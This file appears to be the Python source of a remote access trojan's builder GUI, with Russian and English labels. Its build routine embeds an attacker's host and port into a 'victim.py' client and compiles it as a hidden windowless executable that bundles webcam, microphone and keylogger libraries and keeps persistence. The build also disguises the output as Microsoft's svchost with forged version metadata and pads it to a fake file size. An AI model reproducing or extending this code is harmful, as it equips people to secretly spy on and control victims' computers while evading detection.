        btn_icon = tk.Button(form, command=self.browse_icon, bg='#34495e', fg='white')
        btn_icon.grid(row=4, column=2, padx=5)
        self.register_widget(btn_icon, 'browse')

        # Version
        lbl_ver = tk.Label(form, fg='white', bg='#2c3e50', font=('Arial', 10))
        lbl_ver.grid(row=5, column=0, sticky='w', pady=5)
        self.register_widget(lbl_ver, 'file_version')
        self.file_version_entry = tk.Entry(form, width=40, bg='white')
        self.file_version_entry.grid(row=5, column=1, pady=5, padx=10)
        self.file_version_entry.insert(0, "5.1.2600.0")

        # Process name
        lbl_proc = tk.Label(form, text="Process name:", fg='white', bg='#2c3e50', font=('Arial', 10))
        lbl_proc.grid(row=6, column=0, sticky='w', pady=5)
        self.process_name_entry = tk.Entry(form, width=40, bg='white')
        self.process_name_entry.grid(row=6, column=1, pady=5, padx=10)
        self.process_name_entry.insert(0, "svchost.exe")
        self.register_widget(lbl_proc, 'process_name')

        # Fake size
        lbl_size = tk.Label(form, fg='white', bg='#2c3e50', font=('Arial', 10))
        lbl_size.grid(row=7, column=0, sticky='w', pady=5)
        self.register_widget(lbl_size, 'fake_size')
        size_frame = tk.Frame(form, bg='#2c3e50')
        size_frame.grid(row=7, column=1, pady=5, padx=10, sticky='w')
        self.fake_size_value = tk.Entry(size_frame, width=20, bg='white')
        self.fake_size_value.pack(side='left', padx=(0, 5))
        self.fake_size_unit = tk.StringVar(value="MB")
        self.unit_menu = ttk.Combobox(size_frame, textvariable=self.fake_size_unit,
                                      values=[self.tr('bytes'), self.tr('kb'), self.tr('mb')], width=8,
                                      state='readonly')
        self.unit_menu.pack(side='left')

        # Safe Mode
        self.safe_mode_var = tk.BooleanVar(value=False)
        safe_check = tk.Checkbutton(form, variable=self.safe_mode_var, bg='#2c3e50', fg='white', selectcolor='#2c3e50')
        safe_check.grid(row=8, column=0, columnspan=3, pady=10, sticky='w')
        self.register_widget(safe_check, 'safe_mode')

        # Build button
        self.build_btn = tk.Button(form, command=self.build_client, bg='#1abc9c', fg='white', font=('Arial', 12),
                                   padx=20, pady=5)
        self.build_btn.grid(row=9, column=0, columnspan=3, pady=30)
        self.register_widget(self.build_btn, 'build_button')

        self.build_log = scrolledtext.ScrolledText(self.build_frame, width=90, height=15, bg='#ecf0f1', fg='#2c3e50')
        self.build_log.pack(fill='both', expand=True, padx=10, pady=10)

    def browse_output_dir(self):
        directory = filedialog.askdirectory()
        if directory:
            self.output_dir_entry.delete(0, tk.END)
            self.output_dir_entry.insert(0, directory)

    def browse_icon(self):
        filepath = filedialog.askopenfilename(filetypes=[("Image files", "*.png *.jpg *.jpeg *.ico")])
        if filepath:
            self.icon_path_entry.delete(0, tk.END)
            self.icon_path_entry.insert(0, filepath)

    def build_client(self):
        output_name = self.output_name_combo.get().strip()
        output_dir = self.output_dir_entry.get().strip()
        icon = self.icon_path_entry.get().strip()
        version = self.file_version_entry.get().strip()
        server_host = self.build_server_host_combo.get().strip()
        server_port = self.build_server_port_combo.get().strip()
        proc_name = self.process_name_entry.get().strip()
        if not proc_name:
            proc_name = "svchost.exe"

        self.output_name_combo.save_value()
        self.build_server_host_combo.save_value()
        self.build_server_port_combo.save_value()

        self.last_server_host = server_host
        self.last_server_port = server_port

        try:
            size_val = float(self.fake_size_value.get().strip())
        except:
            size_val = 0
        unit_raw = self.fake_size_unit.get()
        if unit_raw == self.tr('kb'):
            unit = 'KB'
            fake_size = int(size_val * 1024)
        elif unit_raw == self.tr('mb'):
            unit = 'MB'
            fake_size = int(size_val * 1024 * 1024)
        else:
            unit = 'Bytes'
            fake_size = int(size_val)

        if not output_name.endswith('.exe'):
            output_name += '.exe'
        if not os.path.exists(output_dir):
            os.makedirs(output_dir, exist_ok=True)

        build_dir = tempfile.mkdtemp()
        client_script = os.path.join(build_dir, 'victim.py')
        if not os.path.exists('victim.py'):
            self.log_console(self.tr('not_found_victim_py'))
            self.build_log.insert(tk.END, self.tr('not_found_victim_py') + "\n")
            return

        with open('victim.py', 'r', encoding='utf-8') as src:
            code = src.read()

        # Замена host, port, proc_name
        patterns = [
            (r"(RATClient\s*\(\s*host\s*=\s*['\"])([^'\"]+)(['\"]\s*,\s*port\s*=\s*)(\d+)(\s*,\s*proc_name\s*=\s*['\"])([^'\"]+)(['\"]\s*\))",
             rf"\g<1>{server_host}\g<3>{server_port}\g<5>{proc_name}\g<7>"),
            (r"(RATClient\s*\(\s*['\"])([^'\"]+)(['\"]\s*,\s*)(\d+)(\s*,\s*['\"])([^'\"]+)(['\"]\s*\))",
             rf"\g<1>{server_host}\g<3>{server_port}\g<5>{proc_name}\g<7>"),
        ]
        for pattern, replacement in patterns:
            new_code = re.sub(pattern, replacement, code)
            if new_code != code:
                code = new_code
                break

        if self.safe_mode_var.get():
            code = code.replace('self.install_persistence()', '# self.install_persistence()  # Safe mode')
            self.log_console(self.tr('safe_mode_enabled'))
            self.build_log.insert(tk.END, self.tr('safe_mode_enabled') + "\n")

        with open(client_script, 'w', encoding='utf-8') as dst:
            dst.write(code)

        # Version file
        version_file = None
        if version:
            version_parts = version.split('.')
            while len(version_parts) < 4:
                version_parts.append('0')
            version_file = os.path.join(build_dir, 'version.rc')
            with open(version_file, 'w') as f:
                f.write(f'''# UTF-8
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=({', '.join(version_parts)}),
    prodvers=({', '.join(version_parts)}),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'FileVersion', u'{version}'),
         StringStruct(u'ProductVersion', u'{version}'),
         StringStruct(u'CompanyName', u'Microsoft Corporation'),
         StringStruct(u'InternalName', u'svchost'),
         StringStruct(u'OriginalFilename', u'{output_name}'),
         StringStruct(u'ProductName', u'Microsoft® Windows® Operating System'),
         StringStruct(u'FileDescription', u'Host Process for Windows Services')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
''')

        cmd = [sys.executable, '-m', 'PyInstaller', '--onefile', '--noconsole',
               '--hidden-import', 'cv2',
               '--hidden-import', 'numpy',
               '--hidden-import', 'pyaudio',
               '--hidden-import', 'pynput',
               '--hidden-import', 'PIL',
               '--collect-all', 'cv2',
               '--collect-all', 'numpy',
               '--name', output_name[:-4], '--distpath', build_dir,
               '--workpath', build_dir, '--specpath', build_dir]

        for sp in site.getsitepackages():
            cmd.extend(['--paths', sp])

        if icon:
            ico_path = os.path.join(build_dir, 'icon.ico')
            try:
                img = PIL.Image.open(icon)
                img.save(ico_path, format='ICO', sizes=[(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)])
                cmd.append('--icon')
                cmd.append(ico_path)
            except Exception as e:
                self.log_console(self.tr('log_icon_error', e=str(e)))
                self.build_log.insert(tk.END, self.tr('log_icon_error', e=str(e)) + "\n")
        if version_file:
            cmd.append('--version-file')
            cmd.append(version_file)
        cmd.append(client_script)

        self.log_console(self.tr('log_build_start'))
        self.build_log.insert(tk.END, self.tr('building') + "\n")
        self.build_log.update()

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=build_dir)
            if result.returncode != 0:
                self.log_console(self.tr('log_build_failed', err=result.stderr))
                self.build_log.insert(tk.END, self.tr('build_failed', err=result.stderr) + "\n")
                return
            built_exe = os.path.join(build_dir, output_name)
            if not os.path.exists(built_exe):
                built_exe = os.path.join(build_dir, output_name[:-4], output_name)
            if not os.path.exists(built_exe):
                self.log_console(self.tr('log_exe_not_found'))
                self.build_log.insert(tk.END, self.tr('log_exe_not_found') + "\n")
                return

            if fake_size > 0:
                with open(built_exe, 'ab') as f:
                    current_size = f.tell()
                    if current_size < fake_size:
                        f.write(b'\x00' * (fake_size - current_size))
                    self.log_console(self.tr('log_padding', old=current_size, new=fake_size, val=size_val, unit=unit))
                    self.build_log.insert(tk.END, self.tr('padding_info', old=current_size, new=fake_size, val=size_val,
                                                          unit=unit) + "\n")

            final_path = os.path.join(output_dir, output_name)
            shutil.copy(built_exe, final_path)
            self.log_console(self.tr('log_build_success', path=final_path))
            self.build_log.insert(tk.END, self.tr('build_success', path=final_path) + "\n")
            if self.safe_mode_var.get():
                self.build_log.insert(tk.END, self.tr('safe_mode_warning') + "\n")
            else:
                self.build_log.insert(tk.END, self.tr('normal_warning') + "\n")
        except Exception as e:
            self.log_console(f"Error: {e}")
            self.build_log.insert(tk.END, f"Error: {e}\n")

    # ---------- Console Tab ----------
    def create_console_tab(self):
        self.console_text = scrolledtext.ScrolledText(self.console_frame, width=100, height=30, bg='black',
                                                      fg='#00ff00', insertbackground='white')
        self.console_text.pack(fill='both', expand=True, padx=10, pady=10)
        self.log_console(self.tr('console_welcome'))

    def log_console(self, message):
        print(message)
        if hasattr(self, 'console_text'):
            self.console_text.insert(tk.END, message + "\n")
            self.console_text.see(tk.END)
            self.console_text.update_idletasks()

    # ---------- Language Tab ----------
    def create_language_tab(self):
        frame = tk.Frame(self.language_frame, bg='#2c3e50')
        frame.pack(pady=50)

        lbl = tk.Label(frame, fg='white', bg='#2c3e50', font=('Arial', 14))
        lbl.pack(pady=20)
        self.register_widget(lbl, 'language_header')

        btn_en = tk.Button(frame, text='English', command=lambda: self.set_language('en'), bg='#34495e', fg='white',
                           font=('Arial', 12), padx=20)
        btn_en.pack(pady=10)
        btn_ru = tk.Button(frame, text='Русский', command=lambda: self.set_language('ru'), bg='#34495e', fg='white',
                           font=('Arial', 12), padx=20)
        btn_ru.pack(pady=10)

    def run(self):
        self.root.mainloop()


if __name__ == '__main__':
    server = RATServer()
    server.run()